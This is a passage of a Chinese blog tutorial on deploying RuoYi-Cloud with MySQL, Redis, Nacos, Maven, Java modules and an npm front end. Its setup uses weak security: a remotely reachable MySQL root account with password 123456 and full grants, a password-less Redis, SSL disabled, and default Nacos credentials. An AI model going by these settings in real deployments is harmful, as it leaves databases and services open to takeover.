mysql.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.<br>Executing: /usr/lib/systemd/systemd-sysv-install <span class="hljs-built_in">enable</span> mysql<br></code></pre></td></tr></table></figure><p>查看所有用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select user,host from mysql.user;<br></code></pre></td></tr></table></figure><p>创建root账号，密码123456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; create user root @&#x27;%&#x27; identified by &#x27;123456&#x27;;<br></code></pre></td></tr></table></figure><p>用户所有权限但是不包括授权的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; grant all on *.* to root@&#x27;%&#x27;; <br></code></pre></td></tr></table></figure><p>给用户可以授权其他用户的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; grant Grant option on *.* to root@&#x27;%&#x27;;<br></code></pre></td></tr></table></figure><p>修改监听地址<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e6bd7269c87448888bc7f55f763f0404.png" alt="在这里插入图片描述"></p><p><strong>注意</strong>：配置8.0版本参考：我这里通过这种方式没有实现所有IP都能访问；我是通过直接修改配置文件才实现的，MySQL8.0版本把配置文件 <code>my.cnf</code> 拆分成<code>mysql.cnf </code>和<code>mysqld.cnf</code>，我们需要修改的是<code>mysqld.cnf</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local mysql]# vim /etc/mysql/mysql.conf.d/mysqld.cnf<br>...<br>bind-address            = 0.0.0.0<br>mysqlx-bind-address     = 0.0.0.0<br></code></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local mysql.conf.d]# systemctl restart mysql<br></code></pre></td></tr></table></figure><p>查看</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/915127f0e9dd429c870b83b1e4e0e283.png" alt="在这里插入图片描述"></p><h2 id="安装redis"><a href="#安装redis" class="headerlink" title="安装redis"></a>安装redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local apt]# apt install redis<br></code></pre></td></tr></table></figure><p>加入开机自启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local apt]# systemctl list-units --<span class="hljs-built_in">type</span>=service | grep redis<br>  redis-server.service                   loaded active     running      Advanced key-value store<br>  <br>[root@node1.local apt]# systemctl <span class="hljs-built_in">enable</span> redis-server.service --now<br>Synchronizing state of redis-server.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.<br>Executing: /usr/lib/systemd/systemd-sysv-install <span class="hljs-built_in">enable</span> redis-server<br></code></pre></td></tr></table></figure><h2 id="安装nacos"><a href="#安装nacos" class="headerlink" title="安装nacos"></a>安装nacos</h2><p>先部署微服务注册中心Nacos，在部署微服务层各个模块，最后接入前端UI</p><p>官方地址：<a href="https://nacos.io/zh-cn/">https://nacos.io/zh-cn/</a></p><p>下载tar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# wget https://github.com/alibaba/nacos/releases/download/2.1.1/nacos-server-2.1.1.tar.gz<br></code></pre></td></tr></table></figure><p>解压tar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# tar -xf nacos-server-2.1.1.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> nacos<br></code></pre></td></tr></table></figure><p>编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# <span class="hljs-built_in">cd</span> ./nacos/conf/<br>[root@node1.local conf]# ll<br>total 96<br>drwxr-xr-x 2  502 staff  4096 Feb 10 16:20 ./<br>drwxr-xr-x 5 root root   4096 Feb 10 16:03 ../<br>-rw-r--r-- 1  502 staff  1224 May 11  2022 1.4.0-ipv6_support-update.sql<br>-rw-r--r-- 1  502 staff  9798 Feb 10 16:20 application.properties<br>-rw-r--r-- 1  502 staff  9754 Aug  8  2022 application.properties.example<br>-rw-r--r-- 1  502 staff   670 Aug  8  2022 cluster.conf.example<br>-rw-r--r-- 1  502 staff 31156 Aug  8  2022 nacos-logback.xml<br>-rw-r--r-- 1  502 staff 10825 Aug  8  2022 nacos-mysql.sql<br>-rw-r--r-- 1  502 staff  8939 Aug  8  2022 schema.sql<br><br>[root@node1.local conf]# vim application.properties<br><span class="hljs-comment">###nacos的默认访问路径（不需要修改）</span><br>server.servlet.contextPath=/nacos<br><br><span class="hljs-comment">#nacos默认端口（不需要修改）</span><br>server.port=8848<br><br><span class="hljs-comment">###使用MySQL作为数据源（取消注释）</span><br>spring.datasource.platform=mysql<br><br><span class="hljs-comment">###数据库数量（取消注释）</span><br>db.num=1<br><br><span class="hljs-comment">###连接数据库的信息（连接本机数据库地址不需要修改）</span><br><span class="hljs-comment">###JDBC连接数据库最后面添加 &amp;allowPublicKeyRetrieval=true 允许进行SSL连接，MySQL高版本不开启该参数会导致SSL连接时出现错误，Nacos无法启动</span><br>db.url.0=jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=<span class="hljs-literal">true</span>&amp;useUnicode=<span class="hljs-literal">true</span>&amp;useSSL=<span class="hljs-literal">false</span>&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=<span class="hljs-literal">true</span><br><br><span class="hljs-comment">###连接数据库的用户名（需要指定用户名）</span><br>db.user.0=root<br><br><span class="hljs-comment">###连接数据库的用户密码（需要指定用户名密码）</span><br>db.password.0=123456<br></code></pre></td></tr></table></figure><p>在MySQL中创建<code>ry-cloud</code>数据库</p><p>登录数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[root@node1.local conf]# mysql -uroot -p123456<br></code></pre></td></tr></table></figure><p>创建ry-cloud库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; create database `ry-cloud` charset utf8;<br></code></pre></td></tr></table></figure><p>创建ry-config库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; create database `ry-config` charset utf8;<br></code></pre></td></tr></table></figure><p>查看所有库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| ry-cloud           |<br>| ry-config          |<br>| sys                |<br>+--------------------+<br>6 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><p>导入数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local sql]# <span class="hljs-built_in">pwd</span><br>/root/RuoYi-Cloud/RuoYi-Cloud-master/sql<br><br>[root@node1.local sql]# ll<br>total 100<br>drwxr-xr-x  2 root root  4096 Jan  7 10:55 ./<br>drwxr-xr-x 13 root root  4096 Jan  7 10:55 ../<br>-rw-r--r--  1 root root 11985 Jan  7 10:55 quartz.sql<br>-rw-r--r--  1 root root 56722 Jan  7 10:55 ry_20240629.sql<br>-rw-r--r--  1 root root 20053 Jan  7 10:55 ry_config_20240902.sql<br>-rw-r--r--  1 root root  3083 Jan  7 10:55 ry_seata_20210128.sql<br><br>导入数据<br>[root@node1.local sql]# mysql -uroot -p123456 ry-config &lt;ry_config_20240902.sql<br>mysql: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>[root@node1.local sql]# mysql -uroot -p123456 ry-cloud &lt; ry_20240629.sql<br>mysql: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br></code></pre></td></tr></table></figure><p>修改Nacos的<code>application.properties</code>文件，将默认的Nacos库指向新的<code>ry-config</code>库，这样Nacos就可以管理项目的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">vim nacos/conf/application.properties<br>....<br>db.url.0=jdbc:mysql://192.1.7.244:3306/ry-config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true<br>db.user.0=root<br>db.password.0=123456<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/bc81d0d7092c47c6b8e916e5a4fbbd6e.png" alt="在这里插入图片描述"></p><p>启动 Nacos 服务（standalone表示单机模式运行，非集群模式）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local bin]# <span class="hljs-built_in">pwd</span><br>/root/nacos/bin<br><br>[root@node1.local bin]# ./startup.sh -m standalone<br>/usr/local/src/jdk/jdk1.8.0_431/bin/java -Djava.ext.dirs=/usr/local/src/jdk/jdk1.8.0_431/jre/lib/ext:/usr/local/src/jdk/jdk1.8.0_431/lib/ext  -Xms512m -Xmx512m -Xmn256m -Dnacos.standalone=<span class="hljs-literal">true</span> -Dnacos.member.list= -Xloggc:/root/nacos/logs/nacos_gc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M -Dloader.path=/root/nacos/plugins/health,/root/nacos/plugins/cmdb,/root/nacos/plugins/selector -Dnacos.home=/root/nacos -jar /root/nacos/target/nacos-server.jar  --spring.config.additional-location=file:/root/nacos/conf/ --logging.config=/root/nacos/conf/nacos-logback.xml --server.max-http-header-size=524288<br>nacos is starting with standalone<br>nacos is starting，you can check the /root/nacos/logs/start.out<br></code></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local bin]# <span class="hljs-built_in">tail</span> -f 100 /root/nacos/logs/start.out<br></code></pre></td></tr></table></figure><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">地址：http://192.1.7.244:8848/nacos/index.html<br>账号：nacos<br>密码：nacos<br></code></pre></td></tr></table></figure><p>此时Nacos已经获取到RuoYi-Cloud各组件的配置文件，后续修改各组件的配置文件，在Nacos中修改即可。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/220a52f5c6984b3b86ec2b609b3a6bca.png" alt="在这里插入图片描述"></p><h2 id="打包RuoYi-Cloud项目"><a href="#打包RuoYi-Cloud项目" class="headerlink" title="打包RuoYi Cloud项目"></a>打包RuoYi Cloud项目</h2><p>进入RuoYi-Cloud目录打包项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# <span class="hljs-built_in">cd</span> RuoYi-Cloud<br></code></pre></td></tr></table></figure><p>使用maven打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# mvn clean package -Dmaven.test.skip=<span class="hljs-literal">true</span><br>....<br>[INFO] ------------------------------------------------------------------------<br>[INFO] Reactor Summary <span class="hljs-keyword">for</span> ruoyi 3.6.5:<br>[INFO] <br>[INFO] ruoyi .............................................. SUCCESS [  8.096 s]<br>[INFO] ruoyi-common ....................................... SUCCESS [  0.002 s]<br>[INFO] ruoyi-common-core .................................. SUCCESS [01:35 min]<br>[INFO] ruoyi-api .......................................... SUCCESS [  0.002 s]<br>[INFO] ruoyi-api-system ................................... SUCCESS [  0.233 s]<br>[INFO] ruoyi-common-redis ................................. SUCCESS [  5.422 s]<br>[INFO] ruoyi-common-security .............................. SUCCESS [  0.772 s]<br>[INFO] ruoyi-auth ......................................... SUCCESS [ 58.992 s]<br>[INFO] ruoyi-gateway ...................................... SUCCESS [ 17.479 s]<br>[INFO] ruoyi-visual ....................................... SUCCESS [  0.001 s]<br>[INFO] ruoyi-visual-monitor ............................... SUCCESS [  6.823 s]<br>[INFO] ruoyi-common-datasource ............................ SUCCESS [  9.523 s]<br>[INFO] ruoyi-common-datascope ............................. SUCCESS [  0.121 s]<br>[INFO] ruoyi-common-log ................................... SUCCESS [  0.191 s]<br>[INFO] ruoyi-common-swagger ............................... SUCCESS [  1.419 s]<br>[INFO] ruoyi-modules ...................................... SUCCESS [  0.001 s]<br>[INFO] ruoyi-modules-system ............................... SUCCESS [  1.307 s]<br>[INFO] ruoyi-modules-gen .................................. SUCCESS [  1.825 s]<br>[INFO] ruoyi-modules-job .................................. SUCCESS [  1.882 s]<br>[INFO] ruoyi-modules-file ................................. SUCCESS [ 13.886 s]<br>[INFO] ruoyi-common-seata ................................. SUCCESS [ 24.541 s]<br>[INFO] ruoyi-common-sensitive ............................. SUCCESS [  0.109 s]<br>[INFO] ------------------------------------------------------------------------<br>[INFO] BUILD SUCCESS<br>[INFO] ------------------------------------------------------------------------<br>[INFO] Total <span class="hljs-keyword">time</span>:  04:28 min<br>[INFO] Finished at: 2025-02-10T18:26:29+08:00<br>[INFO] ------------------------------------------------------------------------<br><br></code></pre></td></tr></table></figure><p>如果打包其中的一个项目，可以使用这种方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn package -Dmaven.test.skip=<span class="hljs-literal">true</span> -pl ruoyi-modules/ruoyi-system/ -am<br></code></pre></td></tr></table></figure><h1 id="四、部署模块"><a href="#四、部署模块" class="headerlink" title="四、部署模块"></a>四、部署模块</h1><h2 id="部署system系统模块"><a href="#部署system系统模块" class="headerlink" title="部署system系统模块"></a>部署system系统模块</h2><p>登录到nacos修改<code>ruoyi-system-dev.yml</code>文件，需要指定连接数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># spring配置</span><br>spring:<br>  redis:<br>    <span class="hljs-comment"># 定义连接Redis的主机(默认本机不需要改)</span><br>    host: localhost<br>    port: 6379<br>    password:<br>      datasource:<br>         <span class="hljs-comment"># 主库数据源,连接MySQL数据库的用户名和密码需要修改</span><br>          master:<br>            driver-class-name: com.mysql.cj.jdbc.Driver<br>            url: jdbc:mysql://192.1.7.244:3306/ry-cloud?useUnicode=<span class="hljs-literal">true</span>&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=<span class="hljs-literal">true</span>&amp;serverTimezone=GMT%2B8<br>            username: root<br>            password: 123456<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a55bb6d34e20443cb0e90096e0d616f6.png" alt="在这里插入图片描述"></p><p>添加配置后，点击右下角的【发布】即可。</p><p>启动ruoyi-system模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -Dspring.profiles.active=dev \<br>-Dspring.cloud.nacos.config.file-extension=yml \<br>-Dspring.cloud.nacos.discovery.server-addr=192.1.7.244:8848 \<br>-Dspring.cloud.nacos.config.server-addr=192.1.7.244:8848 \<br>-jar /root/RuoYi-Cloud/RuoYi-Cloud-master/ruoyi-modules/ruoyi-system/target/ruoyi-modules-system.jar &amp;&gt; /var/log/ruoyi-system.log &amp;<br></code></pre></td></tr></table></figure><p>命令解释：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">java                                    //Java 命令<br>-Dspring.profiles.active       //在spring中用于设置程序的配置环境（dev开发，<span class="hljs-built_in">test</span>测试，prod生产）<br>-Dspring.cloud.nacos.config.file-extension //指定了程序的配置文件在Nacos的扩展名为yml<br>-Dspring.cloud.nacos.discovery.server-addr //指定了Nacos服务发现的地址和端口<br>-Dspring.cloud.nacos.config.server-addr    //指定了Nacos配置中心的地址和端口<br>-jar                                      //指定jar包路径和名称<br></code></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# <span class="hljs-built_in">tail</span> -f /var/log/ruoyi-system.log<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/689885a37e874b45924815531e471310.png" alt="在这里插入图片描述"></p><p>nacos查看服务，这时候可以看见服务已经注册上来了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/914fc6e1a1914943b8045ba6bf8dff42.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ac7fa1990b054658bb46c0b82e3d5727.png" alt="在这里插入图片描述"></p><p>注册成功后，网关就可以通过Nacos获取到该服务的信息，来调用该服务。</p><h2 id="部署auth认证模块"><a href="#部署auth认证模块" class="headerlink" title="部署auth认证模块"></a>部署auth认证模块</h2><p>登录Nacos修改<code>ruoyi-auth-dev.yml</code>文件，指定连接Redis信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">spring:<br>  redis:<br>    host: localhost<br>    port: 6379<br>    password:<br></code></pre></td></tr></table></figure><p>添加配置后，点击右下角的【发布】即可。</p><p>启动ruoy-auth模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -Dspring.profiles.active=dev \<br>-Dspring.cloud.nacos.config.file-extension=yml \<br>-Dspring.cloud.nacos.discovery.server-addr=192.1.7.244:8848 \<br>-Dspring.cloud.nacos.config.server-addr=192.1.7.244:8848 \<br>-jar /root/RuoYi-Cloud/RuoYi-Cloud-master/ruoyi-auth/target/ruoyi-auth.jar &amp;&gt; /var/log/ruoyi-auth.log &amp;<br><br></code></pre></td></tr></table></figure><p>查看日志</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b22181b65b3946c692cbad2006bb2236.png" alt="在这里插入图片描述"></p><p>在Nacos服务列表中查看是否注册成功</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2ddb250af3d843e4b574bc7ddd741dde.png" alt="在这里插入图片描述"></p><h2 id="部署gateway网关模块"><a href="#部署gateway网关模块" class="headerlink" title="部署gateway网关模块"></a>部署gateway网关模块</h2><p>登录Nacos修改<code>ruoyi-gateway-dev.yml</code>文件，需要指定连接Redis信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">spring:<br>  redis:<br>    host: localhost<br>    port: 6379<br>    password:<br></code></pre></td></tr></table></figure><p>添加配置后，点击右下角的【发布】即可。</p><p>启动ruoyi-gateway模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -Dspring.profiles.active=dev \<br>-Dspring.cloud.nacos.config.file-extension=yml \<br>-Dspring.cloud.nacos.discovery.server-addr=192.1.7.244:8848 \<br>-Dspring.cloud.nacos.config.server-addr=192.1.7.244:8848 \<br>-jar /root/RuoYi-Cloud/RuoYi-Cloud-master/ruoyi-gateway/target/ruoyi-gateway.jar &amp;&gt; /var/log/ruoyi-gateway.log &amp;<br></code></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local target]# <span class="hljs-built_in">tail</span> -f /var/log/ruoyi-gateway.log<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/cf55971de75042b7aa0ffeeb3037fdd9.png" alt="在这里插入图片描述"></p><p>在Nacos服务列表中查看是否注册成功</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/124b02e0bc564e64882d702ec0faed8c.png" alt="在这里插入图片描述"></p><h2 id="部署monitor监控模块"><a href="#部署monitor监控模块" class="headerlink" title="部署monitor监控模块"></a>部署monitor监控模块</h2><p>monitor配置信息存储在nacos中，文件为ruoyi-monitor-dev.yml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># spring</span><br>spring:<br>  security:<br>    user:<br>      name: admin<br>      password: 123456<br>  boot:<br>    admin:<br>      ui:<br>        title: 若依服务状态监控<br></code></pre></td></tr></table></figure><p>启动ruoyi-monitor模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -Dspring.profiles.active=dev \<br>-Dspring.cloud.nacos.config.file-extension=yml \<br>-Dspring.cloud.nacos.discovery.server-addr=192.1.7.244:8848 \<br>-Dspring.cloud.nacos.config.server-addr=192.1.7.244:8848 \<br>-jar /root/RuoYi-Cloud/RuoYi-Cloud-master/ruoyi-visual/ruoyi-monitor/target/ruoyi-visual-monitor.jar &amp;&gt; /var/log/ruoyi-monitor.log &amp;<br></code></pre></td></tr></table></figure><p>查看日志</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/30e63223cfb04923960d858f69232082.png" alt="在这里插入图片描述"></p><p>在Nacos服务列表中查看是否注册成功</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1ba815c29a734843b380861fa45ba386.png" alt="在这里插入图片描述"></p><p>访问ruoyi-monitor的页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">url: http://192.1.7.244:9100/login<br>账号：admin<br>密码：123456<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fe2227a0a4b74ae2be1b82fddf3c4af1.png" alt="在这里插入图片描述"></p><h2 id="部署ui前端"><a href="#部署ui前端" class="headerlink" title="部署ui前端"></a>部署ui前端</h2><p>修改ruoyi-ui连接gateway的地址（本环境网关与ruoyi-ui部署在同一节点，无需修改）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]#  vim RuoYi-Cloud/ruoyi-ui/vue.config.js<br><span class="hljs-comment">#...</span><br>  devServer: &#123;<br>    host: <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>    port: port,<br>    open: <span class="hljs-literal">true</span>,<br>    proxy: &#123;<br>      // detail: https://cli.vuejs.org/config/#devserver-proxy<br>      [process.env.VUE_APP_BASE_API]: &#123;<br>        target: `http://localhost:8080`,  <span class="hljs-comment">#连接网关地址及端口</span><br></code></pre></td></tr></table></figure><p>切换到UI目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# <span class="hljs-built_in">cd</span> ruoyi-ui/<br></code></pre></td></tr></table></figure><p>指定依赖库地址，需要先下载项目的依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ruoyi-ui]# npm install --registry=https://registry.npmmirror.com<br></code></pre></td></tr></table></figure><p>构建项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ruoyi-ui]# npm run build:prod<br></code></pre></td></tr></table></figure><p><strong>如果构建项目时报错</strong>：error:0308010C:digital envelope routines::unsupported</p><p>主要是因为 nodeJs V17 版本发布了 OpenSSL3.0 对算法和秘钥大小增加了更为严格的限制，nodeJs v17 之前版本没影响，但 V17 和之后版本会出现这个错误。</p><p>输入以下以下命令，强制Node.js使用旧版本的OpenSSL库，以解决与新版本Node.js中加密库不兼容的问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> NODE_OPTIONS=--openssl-legacy-provider<br></code></pre></td></tr></table></figure><p>编译打包项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ruoyi-ui]# npm run build:prod<br></code></pre></td></tr></table></figure><p>打包成功后，会生成一个名为 dist 目录，里边就是前端页面文件，将页面文件放到nginx对应的发布项目目录（比如html目录）即可。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2e7d46f968c04841b30f6e5d64f3444c.png" alt="在这里插入图片描述"></p><p><strong>部署Nginx发布UI（就在当前节点部署即可）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local dist]# apt install nginx -y<br></code></pre></td></tr></table></figure><p>准备UI站点配置文件</p><figure 